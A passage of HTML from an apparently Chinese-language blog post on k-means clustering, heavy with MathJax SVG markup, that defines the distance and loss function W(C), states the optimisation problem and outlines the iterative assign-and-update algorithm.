278H27Q21 284 21 287Z"></path></g></g><g data-mml-node="mo" transform="translate(1808,0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path></g><g data-mml-node="msub" transform="translate(2252.6,0)"><g data-mml-node="mi"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z"></path></g><g data-mml-node="mi" transform="translate(605,-150) scale(0.707)"><path data-c="1D457" d="M297 596Q297 627 318 644T361 661Q378 661 389 651T403 623Q403 595 384 576T340 557Q322 557 310 567T297 596ZM288 376Q288 405 262 405Q240 405 220 393T185 362T161 325T144 293L137 279Q135 278 121 278H107Q101 284 101 286T105 299Q126 348 164 391T252 441Q253 441 260 441T272 442Q296 441 316 432Q341 418 354 401T367 348V332L318 133Q267 -67 264 -75Q246 -125 194 -164T75 -204Q25 -204 7 -183T-12 -137Q-12 -110 7 -91T53 -71Q70 -71 82 -81T95 -112Q95 -148 63 -167Q69 -168 77 -168Q111 -168 139 -140T182 -74L193 -32Q204 11 219 72T251 197T278 308T289 365Q289 372 288 376Z"></path></g></g><g data-mml-node="mo" transform="translate(3198.9,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g></g></g></svg></mjx-container></p><script type="math/tex; mode=display">d(x_i,x_j)=\sum_{k=1}^m(x_{ki}-x_{kj})^2=||x_i-x_j||^2</script><p>然后，定义样本与其所属类的中心之间的距离的总和为损失函数，即</p><script type="math/tex; mode=display">W(C)=\sum_{l=1}^k\sum_{C(i)=l}||x_i-\overline x_l||^2</script><p>其中<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.566ex" xmlns="http://www.w3.org/2000/svg" width="23.006ex" height="2.47ex" role="img" focusable="false" viewBox="0 -841.7 10168.6 1091.7"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msub"><g data-mml-node="mover"><g data-mml-node="mi"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z"></path></g><g data-mml-node="mo" transform="translate(0,374)"><svg width="572" height="237" x="0" y="148" viewBox="143 148 572 237"><path data-c="2013" d="M0 248V285H499V248H0Z" transform="scale(1.716,1)"></path></svg></g></g><g data-mml-node="mi" transform="translate(605,-150) scale(0.707)"><path data-c="1D459" d="M117 59Q117 26 142 26Q179 26 205 131Q211 151 215 152Q217 153 225 153H229Q238 153 241 153T246 151T248 144Q247 138 245 128T234 90T214 43T183 6T137 -11Q101 -11 70 11T38 85Q38 97 39 102L104 360Q167 615 167 623Q167 626 166 628T162 632T157 634T149 635T141 636T132 637T122 637Q112 637 109 637T101 638T95 641T94 647Q94 649 96 661Q101 680 107 682T179 688Q194 689 213 690T243 693T254 694Q266 694 266 686Q266 675 193 386T118 83Q118 81 118 75T117 65V59Z"></path></g></g><g data-mml-node="mo" transform="translate(1143.5,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="mo" transform="translate(2199.3,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="msub" transform="translate(2588.3,0)"><g data-mml-node="mover"><g data-mml-node="mi"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z"></path></g><g data-mml-node="mo" transform="translate(0,374)"><svg width="572" height="237" x="0" y="148" viewBox="143 148 572 237"><path data-c="2013" d="M0 248V285H499V248H0Z" transform="scale(1.716,1)"></path></svg></g></g><g data-mml-node="TeXAtom" transform="translate(605,-150) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mn"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g><g data-mml-node="mi" transform="translate(500,0)"><path data-c="1D459" d="M117 59Q117 26 142 26Q179 26 205 131Q211 151 215 152Q217 153 225 153H229Q238 153 241 153T246 151T248 144Q247 138 245 128T234 90T214 43T183 6T137 -11Q101 -11 70 11T38 85Q38 97 39 102L104 360Q167 615 167 623Q167 626 166 628T162 632T157 634T149 635T141 636T132 637T122 637Q112 637 109 637T101 638T95 641T94 647Q94 649 96 661Q101 680 107 682T179 688Q194 689 213 690T243 693T254 694Q266 694 266 686Q266 675 193 386T118 83Q118 81 118 75T117 65V59Z"></path></g></g></g><g data-mml-node="mo" transform="translate(3807.5,0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path></g><g data-mml-node="msub" transform="translate(4252.2,0)"><g data-mml-node="mover"><g data-mml-node="mi"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z"></path></g><g data-mml-node="mo" transform="translate(0,374)"><svg width="572" height="237" x="0" y="148" viewBox="143 148 572 237"><path data-c="2013" d="M0 248V285H499V248H0Z" transform="scale(1.716,1)"></path></svg></g></g><g data-mml-node="TeXAtom" transform="translate(605,-150) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mn"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g><g data-mml-node="mi" transform="translate(500,0)"><path data-c="1D459" d="M117 59Q117 26 142 26Q179 26 205 131Q211 151 215 152Q217 153 225 153H229Q238 153 241 153T246 151T248 144Q247 138 245 128T234 90T214 43T183 6T137 -11Q101 -11 70 11T38 85Q38 97 39 102L104 360Q167 615 167 623Q167 626 166 628T162 632T157 634T149 635T141 636T132 637T122 637Q112 637 109 637T101 638T95 641T94 647Q94 649 96 661Q101 680 107 682T179 688Q194 689 213 690T243 693T254 694Q266 694 266 686Q266 675 193 386T118 83Q118 81 118 75T117 65V59Z"></path></g></g></g><g data-mml-node="mo" transform="translate(5471.5,0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path></g><g data-mml-node="mo" transform="translate(5916.1,0)"><path data-c="2026" d="M78 60Q78 84 95 102T138 120Q162 120 180 104T199 61Q199 36 182 18T139 0T96 17T78 60ZM525 60Q525 84 542 102T585 120Q609 120 627 104T646 61Q646 36 629 18T586 0T543 17T525 60ZM972 60Q972 84 989 102T1032 120Q1056 120 1074 104T1093 61Q1093 36 1076 18T1033 0T990 17T972 60Z"></path></g><g data-mml-node="mo" transform="translate(7254.8,0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path></g><g data-mml-node="msub" transform="translate(7699.5,0)"><g data-mml-node="mover"><g data-mml-node="mi"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z"></path></g><g data-mml-node="mo" transform="translate(0,374)"><svg width="572" height="237" x="0" y="148" viewBox="143 148 572 237"><path data-c="2013" d="M0 248V285H499V248H0Z" transform="scale(1.716,1)"></path></svg></g></g><g data-mml-node="TeXAtom" transform="translate(605,-150) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mi"><path data-c="1D45A" d="M21 287Q22 293 24 303T36 341T56 388T88 425T132 442T175 435T205 417T221 395T229 376L231 369Q231 367 232 367L243 378Q303 442 384 442Q401 442 415 440T441 433T460 423T475 411T485 398T493 385T497 373T500 364T502 357L510 367Q573 442 659 442Q713 442 746 415T780 336Q780 285 742 178T704 50Q705 36 709 31T724 26Q752 26 776 56T815 138Q818 149 821 151T837 153Q857 153 857 145Q857 144 853 130Q845 101 831 73T785 17T716 -10Q669 -10 648 17T627 73Q627 92 663 193T700 345Q700 404 656 404H651Q565 404 506 303L499 291L466 157Q433 26 428 16Q415 -11 385 -11Q372 -11 364 -4T353 8T350 18Q350 29 384 161L420 307Q423 322 423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 181Q151 335 151 342Q154 357 154 369Q154 405 129 405Q107 405 92 377T69 316T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mi" transform="translate(878,0)"><path data-c="1D459" d="M117 59Q117 26 142 26Q179 26 205 131Q211 151 215 152Q217 153 225 153H229Q238 153 241 153T246 151T248 144Q247 138 245 128T234 90T214 43T183 6T137 -11Q101 -11 70 11T38 85Q38 97 39 102L104 360Q167 615 167 623Q167 626 166 628T162 632T157 634T149 635T141 636T132 637T122 637Q112 637 109 637T101 638T95 641T94 647Q94 649 96 661Q101 680 107 682T179 688Q194 689 213 690T243 693T254 694Q266 694 266 686Q266 675 193 386T118 83Q118 81 118 75T117 65V59Z"></path></g></g></g><g data-mml-node="msup" transform="translate(9186,0)"><g data-mml-node="mo"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g><g data-mml-node="TeXAtom" transform="translate(422,363) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mi"><path data-c="54" d="M36 443Q37 448 46 558T55 671V677H666V671Q667 666 676 556T685 443V437H645V443Q645 445 642 478T631 544T610 593Q593 614 555 625Q534 630 478 630H451H443Q417 630 414 618Q413 616 413 339V63Q420 53 439 50T528 46H558V0H545L361 3Q186 1 177 0H164V46H194Q264 46 283 49T309 63V339V550Q309 620 304 625T271 630H244H224Q154 630 119 601Q101 585 93 554T81 486T76 443V437H36V443Z"></path></g></g></g></g></g></svg></mjx-container>是第l个类的均值或中心，<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.777ex" xmlns="http://www.w3.org/2000/svg" width="21.441ex" height="2.563ex" role="img" focusable="false" viewBox="0 -789.6 9477.1 1132.9"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D45B" d="M21 287Q22 293 24 303T36 341T56 388T89 425T135 442Q171 442 195 424T225 390T231 369Q231 367 232 367L243 378Q304 442 382 442Q436 442 469 415T503 336T465 179T427 52Q427 26 444 26Q450 26 453 27Q482 32 505 65T540 145Q542 153 560 153Q580 153 580 145Q580 144 576 130Q568 101 554 73T508 17T439 -10Q392 -10 371 17T350 73Q350 92 386 193T423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 180T152 343Q153 348 153 366Q153 405 129 405Q91 405 66 305Q60 285 60 284Q58 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mi" transform="translate(633,-150) scale(0.707)"><path data-c="1D459" d="M117 59Q117 26 142 26Q179 26 205 131Q211 151 215 152Q217 153 225 153H229Q238 153 241 153T246 151T248 144Q247 138 245 128T234 90T214 43T183 6T137 -11Q101 -11 70 11T38 85Q38 97 39 102L104 360Q167 615 167 623Q167 626 166 628T162 632T157 634T149 635T141 636T132 637T122 637Q112 637 109 637T101 638T95 641T94 647Q94 649 96 661Q101 680 107 682T179 688Q194 689 213 690T243 693T254 694Q266 694 266 686Q266 675 193 386T118 83Q118 81 118 75T117 65V59Z"></path></g></g><g data-mml-node="mo" transform="translate(1171.5,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="munderover" transform="translate(2227.3,0)"><g data-mml-node="mo"><path data-c="2211" d="M61 748Q64 750 489 750H913L954 640Q965 609 976 579T993 533T999 516H979L959 517Q936 579 886 621T777 682Q724 700 655 705T436 710H319Q183 710 183 709Q186 706 348 484T511 259Q517 250 513 244L490 216Q466 188 420 134T330 27L149 -187Q149 -188 362 -188Q388 -188 436 -188T506 -189Q679 -189 778 -162T936 -43Q946 -27 959 6H999L913 -249L489 -250Q65 -250 62 -248Q56 -246 56 -239Q56 -234 118 -161Q186 -81 245 -11L428 206Q428 207 242 462L57 717L56 728Q56 744 61 748Z"></path></g><g data-mml-node="mi" transform="translate(1089,477.1) scale(0.707)"><path data-c="1D45B" d="M21 287Q22 293 24 303T36 341T56 388T89 425T135 442Q171 442 195 424T225 390T231 369Q231 367 232 367L243 378Q304 442 382 442Q436 442 469 415T503 336T465 179T427 52Q427 26 444 26Q450 26 453 27Q482 32 505 65T540 145Q542 153 560 153Q580 153 580 145Q580 144 576 130Q568 101 554 73T508 17T439 -10Q392 -10 371 17T350 73Q350 92 386 193T423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 180T152 343Q153 348 153 366Q153 405 129 405Q91 405 66 305Q60 285 60 284Q58 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="TeXAtom" transform="translate(1089,-285.4) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mi"><path data-c="1D456" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mo" transform="translate(345,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="mn" transform="translate(1123,0)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g></g></g><g data-mml-node="mi" transform="translate(4680.6,0)"><path data-c="1D43C" d="M43 1Q26 1 26 10Q26 12 29 24Q34 43 39 45Q42 46 54 46H60Q120 46 136 53Q137 53 138 54Q143 56 149 77T198 273Q210 318 216 344Q286 624 286 626Q284 630 284 631Q274 637 213 637H193Q184 643 189 662Q193 677 195 680T209 683H213Q285 681 359 681Q481 681 487 683H497Q504 676 504 672T501 655T494 639Q491 637 471 637Q440 637 407 634Q393 631 388 623Q381 609 337 432Q326 385 315 341Q245 65 245 59Q245 52 255 50T307 46H339Q345 38 345 37T342 19Q338 6 332 0H316Q279 2 179 2Q143 2 113 2T65 2T43 1Z"></path></g><g data-mml-node="mo" transform="translate(5184.6,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mi" transform="translate(5573.6,0)"><path data-c="1D436" d="M50 252Q50 367 117 473T286 641T490 704Q580 704 633 653Q642 643 648 636T656 626L657 623Q660 623 684 649Q691 655 699 663T715 679T725 690L740 705H746Q760 705 760 698Q760 694 728 561Q692 422 692 421Q690 416 687 415T669 413H653Q647 419 647 422Q647 423 648 429T650 449T651 481Q651 552 619 605T510 659Q484 659 454 652T382 628T299 572T226 479Q194 422 175 346T156 222Q156 108 232 58Q280 24 350 24Q441 24 512 92T606 240Q610 253 612 255T628 257Q648 257 648 248Q648 243 647 239Q618 132 523 55T319 -22Q206 -22 128 53T50 252Z"></path></g><g data-mml-node="mo" transform="translate(6333.6,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mi" transform="translate(6722.6,0)"><path data-c="1D456" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mo" transform="translate(7067.6,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g><g data-mml-node="mo" transform="translate(7734.4,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="mi" transform="translate(8790.1,0)"><path data-c="1D459" d="M117 59Q117 26 142 26Q179 26 205 131Q211 151 215 152Q217 153 225 153H229Q238 153 241 153T246 151T248 144Q247 138 245 128T234 90T214 43T183 6T137 -11Q101 -11 70 11T38 85Q38 97 39 102L104 360Q167 615 167 623Q167 626 166 628T162 632T157 634T149 635T141 636T132 637T122 637Q112 637 109 637T101 638T95 641T94 647Q94 649 96 661Q101 680 107 682T179 688Q194 689 213 690T243 693T254 694Q266 694 266 686Q266 675 193 386T118 83Q118 81 118 75T117 65V59Z"></path></g><g data-mml-node="mo" transform="translate(9088.1,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g></g></g></svg></mjx-container>。<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.566ex" xmlns="http://www.w3.org/2000/svg" width="10.852ex" height="2.262ex" role="img" focusable="false" viewBox="0 -750 4796.6 1000"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D43C" d="M43 1Q26 1 26 10Q26 12 29 24Q34 43 39 45Q42 46 54 46H60Q120 46 136 53Q137 53 138 54Q143 56 149 77T198 273Q210 318 216 344Q286 624 286 626Q284 630 284 631Q274 637 213 637H193Q184 643 189 662Q193 677 195 680T209 683H213Q285 681 359 681Q481 681 487 683H497Q504 676 504 672T501 655T494 639Q491 637 471 637Q440 637 407 634Q393 631 388 623Q381 609 337 432Q326 385 315 341Q245 65 245 59Q245 52 255 50T307 46H339Q345 38 345 37T342 19Q338 6 332 0H316Q279 2 179 2Q143 2 113 2T65 2T43 1Z"></path></g><g data-mml-node="mo" transform="translate(504,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mi" transform="translate(893,0)"><path data-c="1D436" d="M50 252Q50 367 117 473T286 641T490 704Q580 704 633 653Q642 643 648 636T656 626L657 623Q660 623 684 649Q691 655 699 663T715 679T725 690L740 705H746Q760 705 760 698Q760 694 728 561Q692 422 692 421Q690 416 687 415T669 413H653Q647 419 647 422Q647 423 648 429T650 449T651 481Q651 552 619 605T510 659Q484 659 454 652T382 628T299 572T226 479Q194 422 175 346T156 222Q156 108 232 58Q280 24 350 24Q441 24 512 92T606 240Q610 253 612 255T628 257Q648 257 648 248Q648 243 647 239Q618 132 523 55T319 -22Q206 -22 128 53T50 252Z"></path></g><g data-mml-node="mo" transform="translate(1653,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mi" transform="translate(2042,0)"><path data-c="1D456" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mo" transform="translate(2387,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g><g data-mml-node="mo" transform="translate(3053.8,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="mi" transform="translate(4109.6,0)"><path data-c="1D459" d="M117 59Q117 26 142 26Q179 26 205 131Q211 151 215 152Q217 153 225 153H229Q238 153 241 153T246 151T248 144Q247 138 245 128T234 90T214 43T183 6T137 -11Q101 -11 70 11T38 85Q38 97 39 102L104 360Q167 615 167 623Q167 626 166 628T162 632T157 634T149 635T141 636T132 637T122 637Q112 637 109 637T101 638T95 641T94 647Q94 649 96 661Q101 680 107 682T179 688Q194 689 213 690T243 693T254 694Q266 694 266 686Q266 675 193 386T118 83Q118 81 118 75T117 65V59Z"></path></g><g data-mml-node="mo" transform="translate(4407.6,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g></g></g></svg></mjx-container>是指示函数，取值1或0。</p><p>函数W(C)也称为能量，表示相同类中样本相似的程度。</p><p>k均值聚类就是求解最优化问题：</p><script type="math/tex; mode=display">C^*=\arg\min_CW(C)=\arg\min_C\sum_{l=1}^k\sum_{C(i)=l}||x_i-\overline x_l||^2</script><p>相似的样本被聚到同类时，损失函数值最小，这个目标函数的最优化能达到聚类的目的。</p><p>事实上，k均值聚类的最优解求解问题是NP困难问题。现实中采用迭代的方法求解。</p><p>算法：k均值聚类的算法是一个迭代的过程，每次迭代包括两个步骤。</p><ol><li>首先选择k个类的中心，将样本逐个指派到与其最近的中心的类中，得到一个聚类结果</li><li>然后更新每个类的样本的均值，作为类的新的中心</li><li>重复以上步骤，直到收敛为止。</li></ol><p>k均值聚类算法：</p><img src="/posts/498ab7d9/%E5%9B%BE%E7%89%872.png" class="" 